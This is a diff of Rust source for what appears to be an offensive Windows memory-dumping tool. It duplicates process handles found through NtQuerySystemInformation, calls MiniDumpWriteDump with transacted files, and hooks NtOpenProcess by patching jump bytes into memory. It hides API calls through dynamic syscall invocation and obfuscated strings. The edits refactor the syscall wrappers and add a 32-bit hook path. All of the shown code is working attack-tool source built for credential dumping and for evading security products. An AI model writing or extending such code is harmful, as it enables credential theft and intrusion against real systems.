@@ -13,7 +13,7 @@ use core::panic;
 use std::io::Cursor;
 use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
 use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransaction, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE, SetHandleInformation};
+use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransaction, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, PAGE_EXECUTE_READWRITE, SetHandleInformation};
 
 static mut STATIC_HANDLE: isize = 0;
 
@@ -48,26 +48,19 @@ pub fn dump(key: &str, url: &str) {
         loop
         { 
             buffer =  vec![0u8; bytes as usize];
-            let ret: Option<i32>;
-            let fun: NtQuerySystemInformation;
             ptr = std::mem::transmute(buffer.as_ptr());
             let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
-            
             // Query the system looking for handles information
-            dinvoke::execute_syscall!(&lc!("NtQuerySystemInformation"),fun,ret,16,ptr,bytes,bytes_ptr);
+            let x = dinvoke::nt_query_system_information(16,ptr,bytes,bytes_ptr);
 
-            match ret {
-                Some(x) => 
-                    if x != 0 
-                    {
-                        bytes = *bytes_ptr;
-                    }
-                    else
-                    {
-                        shi = std::mem::transmute(ptr);
-                        break;
-                    },
-                None => { panic!("{}", &lc!("[x] Call to NtQuerySystemInformation failed."));}
+            if x != 0 
+            {
+                bytes = *bytes_ptr;
+            }
+            else
+            {
+                shi = std::mem::transmute(ptr);
+                break;
             }
 
             c = c + 1;
@@ -85,17 +78,13 @@ pub fn dump(key: &str, url: &str) {
 
             if (*shtei).process_id > 4
             {
-                let function_ptr: NtOpenProcess;
                 let handle_ptr: *mut HANDLE = std::mem::transmute(&HANDLE::default());
                 let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&OBJECT_ATTRIBUTES::default());
                 let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
                 let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
-                let ret: Option<i32>; 
+               
                 // PROCESS_DUP_HANDLE as access right
-                dinvoke::execute_syscall!(
-                    "NtOpenProcess",
-                    function_ptr,
-                    ret,
+                let x = dinvoke::nt_open_process(
                     handle_ptr,
                     0x0040,
                     object_attributes,
@@ -103,35 +92,23 @@ pub fn dump(key: &str, url: &str) {
                 );
 
                 let handle;
-
-                match ret {
-                    Some(x) =>
-                    {
-                        if x == 0
-                        {
-                            handle = *handle_ptr;
-                        }
-                        else 
-                        {
-                            shtei = shtei.add(1);
-                            continue;
-                        }
-                    },
-                    None => {shtei = shtei.add(1); continue},
+                if x == 0
+                {
+                    handle = *handle_ptr;
                 }
-
+                else 
+                {
+                    shtei = shtei.add(1);
+                    continue;
+                };
+            
 
                 if handle.0 != 0 && handle.0 != -1
                 {
-                    let func_ptr: NtDuplicateObject;
                     let target = HANDLE {0: (*shtei).handle_value as isize};
                     let dup_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
-                    let ret: Option<i32>; 
                     // Duplicate handle in order to manipulate it
-                    dinvoke::execute_syscall!(
-                        &lc!("NtDuplicateObject"),
-                        func_ptr,
-                        ret,
+                    let x = dinvoke::nt_duplicate_object(
                         handle,
                         target,
                         GetCurrentProcess(),
@@ -141,29 +118,18 @@ pub fn dump(key: &str, url: &str) {
                         0
                     );
 
-                    match ret 
+                    if x != 0 
                     {
-                        Some(x) =>
-                            if x != 0 
-                            {
-                                shtei = shtei.add(1);
-                                continue;
-                            }
-                        None => {shtei = shtei.add(1); continue},
+                        shtei = shtei.add(1);
+                        continue;
                     }
-                    
-
+                                       
                     let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                     let poti_ptr: PVOID = std::mem::transmute(&poti);
-                    let func_ptr: NtQueryObject;
-                    let _ret: Option<i32>; 
                     let ret_lenght: *mut u32 = std::mem::transmute(&u32::default());
 
                     // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
-                    dinvoke::execute_syscall!(
-                        &lc!("NtQueryObject"),
-                        func_ptr,
-                        _ret,
+                    let _ = dinvoke::nt_query_object(
                         *dup_handle,
                         2,
                         poti_ptr,
@@ -172,14 +138,10 @@ pub fn dump(key: &str, url: &str) {
                     );
 
 
-                    let ret: Option<i32>;
-                    let func_ptr: NtQueryObject;
                     let buffer = vec![0u8; *ret_lenght as usize];
                     let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr());
-                    dinvoke::execute_syscall!(
-                        &lc!("NtQueryObject"),
-                        func_ptr,
-                        ret,
+
+                    let x = dinvoke::nt_query_object(
                         *dup_handle,
                         2,
                         poti_ptr,
@@ -187,15 +149,10 @@ pub fn dump(key: &str, url: &str) {
                         ret_lenght
                     );
 
-                    match ret 
+                    if x != 0 
                     {
-                        Some(x) =>
-                            if x != 0 
-                            {
-                                shtei = shtei.add(1);
-                                continue;
-                            }
-                        None => {shtei = shtei.add(1); continue},
+                        shtei = shtei.add(1);
+                        continue;
                     }
 
                     let poti_ptr: *mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr);
@@ -343,7 +300,7 @@ pub fn dump(key: &str, url: &str) {
 
                             if !hook()
                             {
-                                println!("{}", &lc!("[x] Could not hook NtOpenProcess. Exiting."));
+                                println!("{}", &lc!("[x] Could not hook NtOpenProcess."));
                                 return;
                             }
 
@@ -567,12 +524,8 @@ pub fn hook () -> bool
         let size = 13 as usize; // for x64 processor
         let size: *mut usize = std::mem::transmute(&size);
         let old_protection: *mut u32 = std::mem::transmute(&u32::default());
-        let func: NtProtectVirtualMemory;
-        let ret: Option<i32>;
-        dinvoke::execute_syscall!(
-            &lc!("NtProtectVirtualMemory"),
-            func,
-            ret,
+
+        let z = dinvoke::nt_protect_virtual_memory( 
             handle,
             base_address,
             size,
@@ -580,33 +533,35 @@ pub fn hook () -> bool
             old_protection
         );
 
-        match ret {
-            Some(z) => 
-            {
-                if z != 0
-                {
-                    return false;
-                }
-            }    
-            None => {return false;},
+
+        if z != 0
+        {
+            return false;
         }
+
 
         let ntop_ptr = ntop_base_address as *mut u8;
 
-        *ntop_ptr = 0x49;
-        *(ntop_ptr.add(1)) = 0xBB;
-        *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
-        *(ntop_ptr.add(10)) = 0x41;
-        *(ntop_ptr.add(11)) = 0xFF;
-        *(ntop_ptr.add(12)) = 0xE3;
+        if cfg!(target_pointer_width = "64") {
 
+            *ntop_ptr = 0x49;
+            *(ntop_ptr.add(1)) = 0xBB;
+            *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
+            *(ntop_ptr.add(10)) = 0x41;
+            *(ntop_ptr.add(11)) = 0xFF;
+            *(ntop_ptr.add(12)) = 0xE3;
+    
+        } 
+        else 
+        {
+            *ntop_ptr = 0x68;
+            *(ntop_ptr.add(1) as *mut usize) = detour_addresss;
+            *(ntop_ptr.add(5)) = 0xC3
+        } 
+        
         let unused: *mut u32 = std::mem::transmute(&u32::default());
-        let func: NtProtectVirtualMemory;
-        let ret: Option<i32>;
-        dinvoke::execute_syscall!(
-            &lc!("NtProtectVirtualMemory"),
-            func,
-            ret,
+
+        let z = dinvoke::nt_protect_virtual_memory(
             handle,
             base_address,
             size,
@@ -614,15 +569,10 @@ pub fn hook () -> bool
             unused
         );
 
-        match ret {
-            Some(z) => 
-            {
-                if z != 0
-                {
-                    return false;
-                }
-            }    
-            None => {return false;},
+
+        if z != 0
+        {
+            return false;
         }
 
         println!("{}", &lc!("[+] NtOpenProcess hooked."));
